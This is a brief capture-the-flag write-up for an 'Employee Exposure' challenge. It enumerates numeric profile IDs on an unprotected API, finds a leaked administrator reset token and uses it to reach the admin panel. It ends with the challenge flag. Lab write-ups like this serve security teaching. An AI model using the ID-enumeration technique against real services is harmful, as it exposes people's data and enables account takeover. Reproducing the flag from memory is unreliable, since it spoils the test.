# Employee Exposure - Writeup

## 1. Recon

The home page reveals a public API endpoint:

```text
/api/profile/1
```

Requesting it returns JSON.

## 2. Identify the IDOR

Change the numeric ID:

```text
/api/profile/2
/api/profile/3
/api/profile/7
```

The application does not verify that the requester is authorized to access another employee's profile.

Profile 7 contains an administrator record with a reset token:

```json
{"id":7,"username":"ghost","role":"administrator","reset_token":"employee-exposure-reset-7f3a91"}
```

## 3. Access the admin panel

Open `/admin/login` and submit the leaked reset token. The application redirects to `/admin`, where the flag is displayed.

## Flag

```text
EH4X{1D0R_l34k5_m0r3_th4n_y0u_th1nk}
```
